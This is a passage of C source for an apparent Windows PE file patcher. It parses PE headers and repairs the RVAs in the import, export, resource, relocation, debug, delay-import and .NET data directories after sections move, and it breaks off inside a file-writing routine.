#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#include "Patcher.h"


#define ValType WORD
#define IS_LESS(v1, v2)  (v1 < v2)

#define SWAP(r,s)  do{ValType t=r; r=s; s=t; } while(0)

void siftDown(ValType *a, int start, int end)
{
	int root = start;

	while (root * 2 + 1 < end) {
		int child = 2 * root + 1;
		if ((child + 1 < end) && IS_LESS(a[child], a[child + 1])) {
			child += 1;
		}
		if (IS_LESS(a[root], a[child])) {
			SWAP(a[child], a[root]);
			root = child;
		}
		else
			return;
	}
}

void heapsort(ValType *a, int count)
{
	int start, end;

	/* heapify */
	for (start = (count - 2) / 2; start >= 0; start--) {
		siftDown(a, start, count);
	}

	for (end = count - 1; end > 0; end--) {
		SWAP(a[end], a[0]);
		siftDown(a, 0, end);
	}
}


	/* loads a file in RAM 
     * returns a pointer to the loaded file
     * 0 if no success
     */
void *loadFile(const char *filename, DWORD *fileSize) 
{ 
	void *buffer;
	FILE *f;
	errno_t error = fopen_s(&f, filename, "rb");
	if (f == NULL)
	{
		printf("[-] Error %d opening \"%s\" for reading\n", error, filename);
		return NULL;
	}

	fseek(f, 0, SEEK_END);
	*fileSize = ftell(f);
	if (!(*fileSize))
	{
		fclose(f);
		return NULL;
	}

	fseek(f, 0, SEEK_SET);
	buffer = malloc(*fileSize);
	if (*fileSize != fread(buffer, sizeof(char), *fileSize, f)) 
	{ 
		printf("[-] Error reading %d bytes from %s\n", *fileSize, filename);
		free(buffer);
		fclose(f);
		return NULL;
	}
	fclose(f);
	return buffer;
}

    /* loads a file in RAM (memory-mapped)
     * returns a pointer to the loaded file
     * 0 if no success
     */
/*
PIMAGE_DOS_HEADER getMappedFile(const char *filename, __int32 * fileSize)
{
    HANDLE hFile, hMapping;
	void *baseoriginal;
    if ((hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0)) == INVALID_HANDLE_VALUE)
    {
#ifdef DEBUG_MODE
        puts("(could not open)");
#endif
        return 0;
    }
    if (!(hMapping = CreateFileMapping(hFile, 0, PAGE_READONLY | SEC_COMMIT, 0, 0, 0)))
    {
#ifdef DEBUG_MODE
        puts("(mapping failed)");
#endif
        CloseHandle(hFile);
        return 0;
    }
    if (!(baseoriginal = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)))
    {
#ifdef DEBUG_MODE
        puts("(view failed)");
#endif
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 0;
    }
	if ((*fileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) 
	{
		puts("(GetFileSize failed)");
		UnmapViewOfFile(baseoriginal);
		CloseHandle(hMapping);
        CloseHandle(hFile);
		return 0;
	}
	CloseHandle(hMapping);
    CloseHandle(hFile);
    return (PIMAGE_DOS_HEADER)baseoriginal;
}
*/

    /* this will return a pointer immediatly behind the DOS-header
     * 0 if error
     */
PIMAGE_NT_HEADERS skipDosStub(const PIMAGE_DOS_HEADER dos_ptr)
{
    /* look there's enough space for a DOS-header */
    if (IsBadReadPtr(dos_ptr, sizeof(*dos_ptr)))
    {
        puts("not enough space for DOS-header");
        return 0;
    }

     /* validate MZ */
    if (dos_ptr->e_magic != IMAGE_DOS_SIGNATURE)
    {
        puts("not a DOS-stub");
        return 0;
    }

    /* ok, then, go get it */
    return (PIMAGE_NT_HEADERS)((char*)dos_ptr + dos_ptr->e_lfanew);
}

BOOL getPEHeaders(LPCVOID base, PE_HEADERS_PTRS *headers)
{
	/* get header pointer; validate a little bit */
	headers->dos_header = (PIMAGE_DOS_HEADER)base;
    headers->nt_header = skipDosStub(headers->dos_header);
    if (!headers->nt_header)
    {
        puts("cannot skip DOS stub");
        return FALSE;
    }

    /* look there's enough space for PE headers */
    if(IsBadReadPtr(headers->nt_header, sizeof(*headers->nt_header)))
    {
        puts("not enough space for PE headers");
        return FALSE;
    }

    /* validate PE signature */
    if(headers->nt_header->Signature != IMAGE_NT_SIGNATURE)
    {
        puts("not a PE file");
        return FALSE;
    }

	headers->section_headers = (PIMAGE_SECTION_HEADER) ((char *)headers->nt_header + sizeof(*headers->nt_header));
    
    /* some debug output */
#ifdef VDEBUG_MODE
        printf("file header at %#lx\n"
               "optional header at %#lx\n"
               "data directories at %#lx\n"
               "section headers at %#lx\n",
               (unsigned long)(long)((char*)headers->nt_header - (char*)headers->dos_header + offsetof(IMAGE_NT_HEADERS,FileHeader)),
               (unsigned long)(long)((char*)headers->nt_header - (char*)headers->dos_header + offsetof(IMAGE_NT_HEADERS,OptionalHeader)),
               (unsigned long)(long)((char*)headers->nt_header - (char*)headers->dos_header + offsetof(IMAGE_NT_HEADERS,OptionalHeader) + offsetof(IMAGE_OPTIONAL_HEADER,DataDirectory)),
               (unsigned long)(long)((char*)headers->nt_header - (char*)headers->dos_header + sizeof(*(headers->nt_header)))
              );
#endif

    /* get number of sections */
	headers->number_of_sections = headers->nt_header->FileHeader.NumberOfSections;
#ifdef VDEBUG_MODE
    printf("%d sections\n", headers->number_of_sections);
#endif

    /* check there are sections... */
    if(headers->number_of_sections < 1)
    {
        puts("no sections???");
        return FALSE;
    }

    /* validate there's enough space for section headers */
    if(IsBadReadPtr(headers->section_headers, headers->number_of_sections*sizeof(IMAGE_SECTION_HEADER)))
    {
        puts("not enough space for section headers");
        return FALSE;
    }

	return TRUE;
}

int init(LPCVOID base, PE_HEADERS_PTRS *headers, PIMAGE_DOS_HEADER *dos_header,
	PIMAGE_NT_HEADERS *nt_header, PIMAGE_SECTION_HEADER *section_headers, DWORD *num_sections)
{
	BOOL localHeaders = !headers;
	PE_HEADERS_PTRS headers_local;
	if (localHeaders)
		headers = &headers_local;

	if (!getPEHeaders(base, headers))
	{
		puts("[-] Error parsing the PE headers");
		return 1;
	}
	if (dos_header)
		*dos_header = headers->dos_header;
	if (nt_header)
		*nt_header = headers->nt_header;
	if (section_headers)
		*section_headers = headers->section_headers;
	if (num_sections)
		*num_sections = headers->number_of_sections;
	return 0;
}

    /* find the section index given the RVA
     * Returns -1 if not found
     */
int getSectionIndex(
	const unsigned rva, 
	const int num_sections, 
	const PIMAGE_SECTION_HEADER sections)
{
    int sect;    
    for(sect=0; sect < num_sections; sect++)
    {
        /* output section data */
#ifdef VDEBUG_MODE
            printf("section \"%.*s\": RVA %#lx, offset %#lx, length %#lx\n",
                    (int)IMAGE_SIZEOF_SHORT_NAME,
                    sections[sect].Name,
                    (unsigned long)sections[sect].PointerToRawData,
                    (unsigned long)sections[sect].VirtualAddress,
                    (unsigned long)sections[sect].SizeOfRawData
                   );
#endif
        /* compare directory RVA to section RVA */
		if (sections[sect].VirtualAddress <= rva && 
		   (sect == num_sections-1 || rva < sections[sect+1].VirtualAddress))
        {
#ifdef VDEBUG_MODE
            puts(" (taken this one)");
#endif
            return sect;
        }
    }

    return -1;
}

/* find the section index given the pointer to raw data (offset)
* Returns -1 if not found
*/
int getSectionIndexByOffset(
	const unsigned offset,
	const int num_sections,
	const PIMAGE_SECTION_HEADER sections)
{
	int sect;
	for (sect = 0; sect < num_sections; sect++)
	{
		/* output section data */
#ifdef VDEBUG_MODE
		printf("section \"%.*s\": RVA %#lx, offset %#lx, length %#lx\n",
			(int)IMAGE_SIZEOF_SHORT_NAME,
			sections[sect].Name,
			(unsigned long)sections[sect].PointerToRawData,
			(unsigned long)sections[sect].VirtualAddress,
			(unsigned long)sections[sect].SizeOfRawData
			);
#endif
		/* compare directory PointerToRawData to section PointerToRawData */
		if (sections[sect].PointerToRawData <= offset &&
			(sect == num_sections - 1 || offset < sections[sect + 1].PointerToRawData))
		{
#ifdef VDEBUG_MODE
			puts(" (taken this one)");
#endif
			return sect;
		}
	}

	return -1;
}

BOOL repairExportDirectory(
	const PIMAGE_DOS_HEADER dos_header, 
	DWORD dirIdx, DWORD sectIdx, 
	PIMAGE_SECTION_HEADER section_headers, 
	PIMAGE_SECTION_HEADER section_headers_old) 
{	
	PIMAGE_NT_HEADERS nt_header = skipDosStub(dos_header);
	PIMAGE_DATA_DIRECTORY dir = &(nt_header->OptionalHeader.DataDirectory[dirIdx]);
	DWORD num_sections = nt_header->FileHeader.NumberOfSections;

	IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)ADDR(dir->VirtualAddress);
	if (IsBadReadPtr(exp, sizeof(*exp)) || !exp->Name) 
		return FALSE;

	DWORD *names = (DWORD *)ADDRI(exp->AddressOfNames, SECT_IDX(exp->AddressOfNames));
	int delta = RVA_DELTA(SECT_IDX(*names));
	for (DWORD i = 0; i < exp->NumberOfNames; i++, names++)
		*names += delta;

	exp->Name += RVA_DELTA(SECT_IDX(exp->Name));
	exp->AddressOfFunctions += RVA_DELTA(SECT_IDX(exp->AddressOfFunctions));
	exp->AddressOfNames += RVA_DELTA(SECT_IDX(exp->AddressOfNames));
	exp->AddressOfNameOrdinals += RVA_DELTA(SECT_IDX(exp->AddressOfNameOrdinals));

	return TRUE;
}

PIMAGE_BOUND_IMPORT_DESCRIPTOR getBoundImport(LPCVOID base, const char *const dllName)
{
	PIMAGE_NT_HEADERS nt_header = skipDosStub((const PIMAGE_DOS_HEADER)base);
	PIMAGE_DATA_DIRECTORY dir = &(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT]);
	if (!dir->Size)
		return FALSE;

	PIMAGE_BOUND_IMPORT_DESCRIPTOR bimp = (PIMAGE_BOUND_IMPORT_DESCRIPTOR)((BYTE *)base + dir->VirtualAddress);
	if (IsBadReadPtr(bimp, sizeof(*bimp)) || !bimp->OffsetModuleName)
		return FALSE;

	DWORD dllNameLen = strlen(dllName);
	char *boundIDT = (char *)bimp;
	while (!IsBadReadPtr(bimp, sizeof(*bimp)) && bimp->OffsetModuleName)
	{
		if (!strncmp(dllName, boundIDT + bimp->OffsetModuleName, dllNameLen))
			return bimp;
		bimp++;
	}
	return NULL;
}

inline BOOL isBoundImport(LPCVOID base, const char *const dllName)
{
	return getBoundImport(base, dllName) != NULL;
}

BOOL repairImportDirectory(
	const PIMAGE_DOS_HEADER dos_header, 
	DWORD dirIdx, DWORD sectIdx, 
	PIMAGE_SECTION_HEADER section_headers, 
	PIMAGE_SECTION_HEADER section_headers_old) 
{	
	PIMAGE_NT_HEADERS nt_header = skipDosStub(dos_header);
	PIMAGE_DATA_DIRECTORY dir = &(nt_header->OptionalHeader.DataDirectory[dirIdx]);
	DWORD num_sections = nt_header->FileHeader.NumberOfSections;

	PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)ADDR(dir->VirtualAddress);
	if (IsBadReadPtr(imp, sizeof(*imp)) || !imp->Name)
		return FALSE;

	// find any RVA pointing to function names and any pointing to INT
	PIMAGE_THUNK_DATA thunk;
	DWORD anyNamesRVA = 0;
	DWORD anyDLLNamesRVA = 0; // most of the time this is the same as above
	DWORD anyINTRVA = 0; // ..a thunk pointing to the Import Names Table
	while (!anyINTRVA && !IsBadReadPtr(imp, sizeof(*imp)) && imp->Name)
	{
		if (imp->OriginalFirstThunk)
		{
			thunk = (PIMAGE_THUNK_DATA)ADDRI(imp->OriginalFirstThunk, SECT_IDX(imp->OriginalFirstThunk));
			while (!IsBadReadPtr(thunk, sizeof(*thunk)) &&
				thunk->u1.AddressOfData != 0 &&
				IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				thunk++;

			if (thunk->u1.AddressOfData != 0)
			{
				anyINTRVA = imp->OriginalFirstThunk;
				anyNamesRVA = thunk->u1.AddressOfData;
				anyDLLNamesRVA = imp->Name;
			}
		}
		imp++;
	}

	// repeat for IAT
	imp = (PIMAGE_IMPORT_DESCRIPTOR)ADDR(dir->VirtualAddress);
	DWORD anyIATRVA = 0; // ..a thunk pointing to the Import Names Table
	BOOL isBound = isBoundImport(dos_header, (char *)ADDRI(imp->Name, SECT_IDX(imp->Name)));
	while (!anyIATRVA && !IsBadReadPtr(imp, sizeof(*imp)) && imp->Name)
	{
		if (imp->FirstThunk)
		{
			thunk = (PIMAGE_THUNK_DATA)ADDRI(imp->FirstThunk, SECT_IDX(imp->FirstThunk));
			while (!IsBadReadPtr(thunk, sizeof(*thunk)) &&
				thunk->u1.AddressOfData != 0 &&
				IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				thunk++;

			if (thunk->u1.AddressOfData != 0)
			{
				anyIATRVA = imp->FirstThunk;
				if (!isBound)
					anyNamesRVA = thunk->u1.AddressOfData;
				anyDLLNamesRVA = imp->Name;
			}
		}
		imp++;
	}

	int INT_delta = anyINTRVA ? RVA_DELTA(SECT_IDX(anyINTRVA)) : 0;
	int IAT_delta = anyIATRVA ? RVA_DELTA(SECT_IDX(anyIATRVA)) : 0;
	int FNames_delta = anyNamesRVA ? RVA_DELTA(SECT_IDX(anyNamesRVA)) : 0;
	int DLLNames_delta = RVA_DELTA(SECT_IDX(anyDLLNamesRVA));

	imp = (IMAGE_IMPORT_DESCRIPTOR *)ADDR(dir->VirtualAddress);
	for (; !IsBadReadPtr(imp, sizeof(*imp)) && imp->Name; imp++)
	{
		// import name table
		if (imp->OriginalFirstThunk)
		{
			thunk = (PIMAGE_THUNK_DATA)ADDRI(imp->OriginalFirstThunk, SECT_IDX(imp->OriginalFirstThunk));
			for (; thunk->u1.AddressOfData; thunk++)
			{
				if (!IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
					thunk->u1.AddressOfData += FNames_delta;
			}
			imp->OriginalFirstThunk += INT_delta;
		}

		// import address table
		if (imp->FirstThunk) // not sure how can this be NULL but hey
		{
			thunk = (PIMAGE_THUNK_DATA)ADDRI(imp->FirstThunk, SECT_IDX(imp->FirstThunk));
			for (; thunk->u1.AddressOfData; thunk++)
			{
				if (!IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
					thunk->u1.AddressOfData += FNames_delta;
			}
			imp->FirstThunk += IAT_delta;
		}

		imp->Name += DLLNames_delta;
	}

	return TRUE;
}

BOOL repairRsrcDirectory(
	const PIMAGE_DOS_HEADER dos_header, 
	DWORD dirIdx, DWORD sectIdx, 
	PIMAGE_SECTION_HEADER section_headers, 
	PIMAGE_SECTION_HEADER section_headers_old) 
{	
	PIMAGE_NT_HEADERS nt_header = skipDosStub(dos_header);
	PIMAGE_DATA_DIRECTORY dir = &(nt_header->OptionalHeader.DataDirectory[dirIdx]);
	DWORD num_sections = nt_header->FileHeader.NumberOfSections;

#define FIRST_ENTRY(rdir)	(IMAGE_RESOURCE_DIRECTORY_ENTRY *)((char *)rdir + sizeof(IMAGE_RESOURCE_DIRECTORY))
#define LAST_ENTRY(rdir)	(IMAGE_RESOURCE_DIRECTORY_ENTRY *)((char *)rdir + sizeof(IMAGE_RESOURCE_DIRECTORY) + \
							(rdir->NumberOfIdEntries+rdir->NumberOfNamedEntries-1)*sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY))
#define GET_DIR(entry)		(IMAGE_RESOURCE_DIRECTORY *)(ADDR(dir->VirtualAddress) + entry->OffsetToDirectory)
#define NEXT_DIR(rdir)		(IMAGE_RESOURCE_DIRECTORY *)((char *)rdir + sizeof(IMAGE_RESOURCE_DIRECTORY) + \
							(rdir->NumberOfIdEntries+rdir->NumberOfNamedEntries)*sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY))

	IMAGE_RESOURCE_DIRECTORY *rdir = (IMAGE_RESOURCE_DIRECTORY *)ADDR(dir->VirtualAddress);
	if (IsBadReadPtr(rdir, sizeof(*rdir)) || !(rdir->NumberOfIdEntries+rdir->NumberOfNamedEntries))
		return FALSE;

	IMAGE_RESOURCE_DIRECTORY_ENTRY *fentry = FIRST_ENTRY(rdir);
	if (IsBadReadPtr(fentry, sizeof(*fentry)) || !fentry->Id)
		return FALSE;
	IMAGE_RESOURCE_DIRECTORY_ENTRY *lentry = LAST_ENTRY(rdir);
	if (IsBadReadPtr(lentry, sizeof(*lentry)) || !lentry->Id)
		return FALSE;

	while (fentry->DataIsDirectory) 
	{
		fentry = FIRST_ENTRY(rdir);
		rdir = GET_DIR(fentry);
	}
	rdir = (IMAGE_RESOURCE_DIRECTORY *)ADDR(dir->VirtualAddress);
	while (lentry->DataIsDirectory) 
	{
		lentry = LAST_ENTRY(rdir);
		rdir = GET_DIR(lentry);
	}
	
	IMAGE_RESOURCE_DATA_ENTRY *fDEntry = (IMAGE_RESOURCE_DATA_ENTRY *) (ADDR(dir->VirtualAddress) + fentry->OffsetToData);
	IMAGE_RESOURCE_DATA_ENTRY *lDEntry = (IMAGE_RESOURCE_DATA_ENTRY *) (ADDR(dir->VirtualAddress) + lentry->OffsetToData);
	IMAGE_RESOURCE_DATA_ENTRY *dEntry;
	int delta = RVA_DELTA(sectIdx);
	for (dEntry = fDEntry; dEntry < lDEntry+1; dEntry++)
		dEntry->OffsetToData += delta;

#undef FIRST_ENTRY
#undef LAST_ENTRY
#undef NEXT_DIR
#undef GET_DIR

	return TRUE;
}

BOOL repairRelocDirectory(
	const PIMAGE_DOS_HEADER dos_header, 
	DWORD dirIdx, DWORD sectIdx, 
	PIMAGE_SECTION_HEADER section_headers, 
	PIMAGE_SECTION_HEADER section_headers_old) 
{	
	PIMAGE_NT_HEADERS nt_header = skipDosStub(dos_header);
	PIMAGE_DATA_DIRECTORY dir = &(nt_header->OptionalHeader.DataDirectory[dirIdx]);
	DWORD num_sections = nt_header->FileHeader.NumberOfSections;

	PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)ADDR(dir->VirtualAddress);
	if (IsBadReadPtr(block, sizeof(*block)) || !(block->SizeOfBlock))
		return FALSE;

	DWORD readBytes = 0, delta = 0, relSectIdx;
	WORD *entry;
	DWORD *ptr_to_value, relRVA, VA, RVA, numEntries;
	BYTE type;
	DWORD imagebase = nt_header->OptionalHeader.ImageBase;
	while(readBytes < dir->Size && !IsBadReadPtr(block, sizeof(IMAGE_BASE_RELOCATION)) && 
		block->VirtualAddress) 
	{
		numEntries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/2;
		for (DWORD i = 0; i < numEntries; i++) 
		{
			entry = (WORD *)((char *)block + sizeof(IMAGE_BASE_RELOCATION) + i*sizeof(WORD));
			type = ((*entry & 0xf000) >> 12) & 0x0f; 
			if (type != IMAGE_REL_BASED_HIGHLOW &&
				type != IMAGE_REL_BASED_ABSOLUTE) 
			{
#ifdef DEBUG_MODE
				puts(" (unknown relocation type) \n");
#endif
				return FALSE;
			}
			if (type == IMAGE_REL_BASED_ABSOLUTE) continue;
			relRVA = (DWORD) (block->VirtualAddress + (*entry & 0x0fff));
			relSectIdx = SECT_IDX(relRVA);
			ptr_to_value = (DWORD *)ADDRI(relRVA, relSectIdx);
			VA = *ptr_to_value;
			RVA = VA - imagebase; 
			relSectIdx = SECT_IDX(RVA);
  			delta = RVA_DELTA(relSectIdx);
			(*ptr_to_value) += delta;
		}

		delta = RVA_DELTA(SECT_IDX(block->VirtualAddress));
		block->VirtualAddress += delta;
		readBytes += block->SizeOfBlock;
		block = (PIMAGE_BASE_RELOCATION)((char *)block + block->SizeOfBlock);
	}

	return TRUE;
}

BOOL repairDebugDirectory(
	const PIMAGE_DOS_HEADER dos_header, 
	DWORD dirIdx, DWORD sectIdx, 
	PIMAGE_SECTION_HEADER section_headers, 
	PIMAGE_SECTION_HEADER section_headers_old) 
{	
	PIMAGE_NT_HEADERS nt_header = skipDosStub(dos_header);
	PIMAGE_DATA_DIRECTORY dir = &(nt_header->OptionalHeader.DataDirectory[dirIdx]);
	DWORD num_sections = nt_header->FileHeader.NumberOfSections;

	PIMAGE_DEBUG_DIRECTORY dbgEntry = (PIMAGE_DEBUG_DIRECTORY)ADDR(dir->VirtualAddress);
	if (IsBadReadPtr(dbgEntry, sizeof(*dbgEntry)))
		return FALSE;

	DWORD sizeRead = 0;
	while (sizeRead + sizeof(IMAGE_DEBUG_DIRECTORY) <= dir->Size)
	{
		if (dbgEntry->AddressOfRawData)
		{
			DWORD idx = SECT_IDX(dbgEntry->AddressOfRawData);
			int delta = RVA_DELTA(idx);
			dbgEntry->AddressOfRawData += delta;
		}

		if (dbgEntry->PointerToRawData)
			for (DWORD i = 0; i < num_sections; i++)
				if (dbgEntry->PointerToRawData >= section_headers_old[i].PointerToRawData &&
					dbgEntry->PointerToRawData < section_headers_old[i].PointerToRawData + section_headers_old[i].SizeOfRawData)
				{
					dbgEntry->PointerToRawData += section_headers[i].PointerToRawData - section_headers_old[i].PointerToRawData;
					break;
				}

		sizeRead += sizeof(IMAGE_DEBUG_DIRECTORY);
		dbgEntry++;
	}

	return TRUE;
}

BOOL repairDelayIDirectory(
	const PIMAGE_DOS_HEADER dos_header, 
	DWORD dirIdx, DWORD sectIdx, 
	PIMAGE_SECTION_HEADER section_headers, 
	PIMAGE_SECTION_HEADER section_headers_old) 
{	
	PIMAGE_NT_HEADERS nt_header = skipDosStub(dos_header);
	PIMAGE_DATA_DIRECTORY dir = &(nt_header->OptionalHeader.DataDirectory[dirIdx]);
	DWORD num_sections = nt_header->FileHeader.NumberOfSections;

	DELAY_IMPORT_DESCRIPTOR *imp = (DELAY_IMPORT_DESCRIPTOR *)ADDR(dir->VirtualAddress);
	if (IsBadReadPtr(imp, sizeof(*imp)) || !imp->RVAtoDLLName) 
		return FALSE;

	// specs say this should be zero (otherwise it's future extension)
	// however: maybe this time has come (ff 39.0.0.5659 has 0x00000001)
	///if (imp->Attributes != 0x0)
	//	return TRUE;

	DWORD *addPointedToByINT = (DWORD *)ADDRI(imp->RVAtoINT, SECT_IDX(imp->RVAtoINT));
	int inINT_delta = RVA_DELTA(SECT_IDX(*addPointedToByINT));
	
	for (; !IsBadReadPtr(imp, sizeof(*imp)) && imp->RVAtoDLLName; imp++)
	{
		for (DWORD *name = (DWORD *)ADDRI(imp->RVAtoINT, SECT_IDX(imp->RVAtoINT)); *name; name++)
			*name = *name + inINT_delta;

		imp->RVAtoDLLName += (imp->RVAtoDLLName) ? RVA_DELTA(SECT_IDX(imp->RVAtoDLLName)) : 0;
		imp->RVAtoHMODULE += (imp->RVAtoHMODULE) ? RVA_DELTA(SECT_IDX(imp->RVAtoHMODULE)) : 0;
		imp->RVAtoIAT += (imp->RVAtoIAT) ? RVA_DELTA(SECT_IDX(imp->RVAtoIAT)) : 0;
		imp->RVAtoINT += (imp->RVAtoINT) ? RVA_DELTA(SECT_IDX(imp->RVAtoINT)) : 0;
		imp->RVAtoBIAT += (imp->RVAtoBIAT) ? RVA_DELTA(SECT_IDX(imp->RVAtoBIAT)) : 0;
		imp->RVAtoUIAT += (imp->RVAtoUIAT) ? RVA_DELTA(SECT_IDX(imp->RVAtoUIAT)) : 0;
	}

	return TRUE;
}

BOOL repairCLIDirectory(
	const PIMAGE_DOS_HEADER dos_header, 
	DWORD dirIdx, DWORD sectIdx, 
	PIMAGE_SECTION_HEADER section_headers, 
	PIMAGE_SECTION_HEADER section_headers_old) 
{	
	PIMAGE_NT_HEADERS nt_header = skipDosStub(dos_header);
	PIMAGE_DATA_DIRECTORY dir = &(nt_header->OptionalHeader.DataDirectory[dirIdx]);
	DWORD num_sections = nt_header->FileHeader.NumberOfSections;

	IMAGE_COR20_HEADER *cli = (IMAGE_COR20_HEADER *)ADDR(dir->VirtualAddress);
	if (IsBadReadPtr(cli, sizeof(*cli))) 
		return FALSE;

	if (cli->MetaData.VirtualAddress) 
		cli->MetaData.VirtualAddress += RVA_DELTA(SECT_IDX(cli->MetaData.VirtualAddress));
	if (cli->Resources.VirtualAddress) 
		cli->Resources.VirtualAddress += RVA_DELTA(SECT_IDX(cli->Resources.VirtualAddress));
	if (cli->StrongNameSignature.VirtualAddress) 
		cli->StrongNameSignature.VirtualAddress += RVA_DELTA(SECT_IDX(cli->StrongNameSignature.VirtualAddress));
	if (cli->CodeManagerTable.VirtualAddress) 
		cli->CodeManagerTable.VirtualAddress += RVA_DELTA(SECT_IDX(cli->CodeManagerTable.VirtualAddress));
	if (cli->VTableFixups.VirtualAddress) 
		cli->VTableFixups.VirtualAddress += RVA_DELTA(SECT_IDX(cli->VTableFixups.VirtualAddress));
	if (cli->ExportAddressTableJumps.VirtualAddress) 
		cli->ExportAddressTableJumps.VirtualAddress += RVA_DELTA(SECT_IDX(cli->ExportAddressTableJumps.VirtualAddress));
	if (cli->ManagedNativeHeader.VirtualAddress) 
		cli->ManagedNativeHeader.VirtualAddress += RVA_DELTA(SECT_IDX(cli->ManagedNativeHeader.VirtualAddress));

	return TRUE;
}

BOOL repairAllDataDirs(PE_HEADERS_PTRS headers, PIMAGE_SECTION_HEADER section_headers_old)
{
	PIMAGE_DOS_HEADER dos_header = headers.dos_header;
	PIMAGE_NT_HEADERS nt_header = headers.nt_header;
	PIMAGE_SECTION_HEADER section_headers = headers.section_headers;
	int num_sections = headers.number_of_sections;

	DWORD tmpSectIdx;
	printf("[+] Repairing data dirs...");
	for (DWORD j = 0; j < nt_header->OptionalHeader.NumberOfRvaAndSizes; j++)
	{
		PIMAGE_DATA_DIRECTORY dataDir = &(nt_header->OptionalHeader.DataDirectory[j]);
		if (dataDir->VirtualAddress == 0)
			continue;
		printf("%d..", j);
		if (j == IMAGE_DIRECTORY_ENTRY_SECURITY)
			tmpSectIdx = getSectionIndexByOffset(dataDir->VirtualAddress, num_sections, section_headers_old);
		else
			tmpSectIdx = SECT_IDX(dataDir->VirtualAddress);
		if (!repairDataDirectory(dos_header, j, tmpSectIdx, section_headers, section_headers_old))
		{
			printf("\n[-] Error repairing data directory: %d\n", j);
			return FALSE;
		}
	}
	puts("..done");
	return TRUE;
}

BOOL repairDataDirectory(
	const PIMAGE_DOS_HEADER dos_header, 
	DWORD dirIdx, DWORD sectIdx, 
	PIMAGE_SECTION_HEADER section_headers, 
	PIMAGE_SECTION_HEADER section_headers_old) 
{	
	PIMAGE_NT_HEADERS nt_header = skipDosStub(dos_header);
	PIMAGE_DATA_DIRECTORY dir = &(nt_header->OptionalHeader.DataDirectory[dirIdx]);
	DWORD num_sections = nt_header->FileHeader.NumberOfSections;

	if (dir->VirtualAddress == 0)
		return TRUE;

	BOOL retval = FALSE;
	switch (dirIdx) 
	{
	case IMAGE_DIRECTORY_ENTRY_EXPORT:
		retval = repairExportDirectory(dos_header, dirIdx, sectIdx, section_headers, section_headers_old);
		break;
	case IMAGE_DIRECTORY_ENTRY_IMPORT:
		retval = repairImportDirectory(dos_header, dirIdx, sectIdx, section_headers, section_headers_old);
		break;
	case IMAGE_DIRECTORY_ENTRY_RESOURCE:
		retval = repairRsrcDirectory(dos_header, dirIdx, sectIdx, section_headers, section_headers_old);
		break;
	case IMAGE_DIRECTORY_ENTRY_BASERELOC:
		retval = repairRelocDirectory(dos_header, dirIdx, sectIdx, section_headers, section_headers_old);
		break;
	case IMAGE_DIRECTORY_ENTRY_DEBUG:
		retval = repairDebugDirectory(dos_header, dirIdx, sectIdx, section_headers, section_headers_old);
		break;
	case IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG:
	case IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT:
	case IMAGE_DIRECTORY_ENTRY_IAT:
	case IMAGE_DIRECTORY_ENTRY_SECURITY:
	case IMAGE_DIRECTORY_ENTRY_TLS:
		retval = TRUE;
		break;
	case IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT:
		retval = repairDelayIDirectory(dos_header, dirIdx, sectIdx, section_headers, section_headers_old);
		break;
	case IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR:
		retval = repairCLIDirectory(dos_header, dirIdx, sectIdx, section_headers, section_headers_old);
		break;
	case IMAGE_DIRECTORY_ENTRY_GLOBALPTR:
	case IMAGE_DIRECTORY_ENTRY_ARCHITECTURE:
	case IMAGE_DIRECTORY_ENTRY_EXCEPTION:
	default:
		printf("[!] WARNING: don't know how to repair data directory with index %d\n", dirIdx);
		retval = TRUE;
		break;
	}
	if (retval)
	{
		if (dirIdx != IMAGE_DIRECTORY_ENTRY_SECURITY) 
		{
			int delta = RVA_DELTA(sectIdx);
			dir->VirtualAddress += delta;
		}
		else
			dir->VirtualAddress += section_headers[sectIdx].PointerToRawData - section_headers_old[sectIdx].PointerToRawData;
	} 
	return retval;
}

DWORD writeDataToFile(const char *outFilename, LPCVOID data, DWORD bytesToWrite, DWORD fileOffset) 
{
	HANDLE hFile; 
	DWORD dwBytesWritten = 0, filePointer;
	BOOL bErrorFlag = FALSE;
	hFile = CreateFileA(outFilename, // name of the write
						GENERIC_WRITE,          // open for writing
						0,                      // do not share
						NULL,                   // default security
						OPEN_ALWAYS,             // create new file only
						FILE_ATTRIBUTE_NORMAL,  // normal file
						NULL);    
	if (hFile == INVALID_HANDLE_VALUE) 
	{ 
		printf("Unable to open file \"%s\" for writing.\n", outFilename);
		return 0;
	}

	if (fileOffset > 0) 
	{
		filePointer = SetFilePointer(hFile, fileOffset, NULL, FILE_BEGIN);
		if (filePointer == INVALID_SET_FILE_POINTER) 
		{
			puts("Unable to move to offset.\n");
			return 0;
		}
	}

	bErrorFlag = WriteFile( 
					hFile,           // open file handle
					data,      // start of data to write
					bytesToWrite,  // number of bytes to write
					&dwBytesWritten, // number of bytes that were written
					NULL);           // no overlapped structure

	if (FALSE == bErrorFlag)
	{
		puts("Unable to write to file.\n");
		CloseHandle(hFile);
		return 0;
	}
	else
		if (dwBytesWritten != bytesToWrite)
		{
			// This is an error because a synchronous write that results in
			// success (WriteFile returns TRUE) should write all data as
			// requested. This would not necessarily be the case for
			// asynchronous writes.
			puts("Error: dwBytesWritten != dwBytesToWrite\n");
			CloseHandle(hFile);
			return dwBytesWritten;
		}
#ifdef DEBUG_MODE
		else
